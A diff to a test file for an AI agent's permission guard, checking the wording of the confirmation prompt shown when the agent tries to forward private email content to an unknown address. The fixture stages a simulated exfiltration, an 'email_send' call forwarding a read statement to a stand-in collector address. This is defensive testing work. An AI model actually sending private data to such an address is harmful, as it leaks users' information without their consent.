@@ -35,7 +35,10 @@ describe("a send that carries private content", () => {
     readEmail();
     const reason = await verdict(ctx("email_send", { to: "collector@unknown-mail.example", subject: "fwd", body: `Forwarding: ${STATEMENT}` }));
     expect(reason).toMatch(/text from an email you read to collector@unknown-mail\.example/);
-    expect(reason).toMatch(/a yes also covers sending it again in this session to collector@unknown-mail\.example only/);
+    expect(reason).toMatch(/A yes also lets the agent send it to collector@unknown-mail\.example again in this chat\./);
+    // The question leads, in the user's terms; the tool's name is not on the card.
+    expect(reason).toMatch(/^Send text from an email you read to collector@unknown-mail\.example\? You haven't named that address in this chat/);
+    expect(reason).not.toContain("email_send");
     expect(reason).not.toContain("4471"); // the card names where it came from, never the content
   });
 
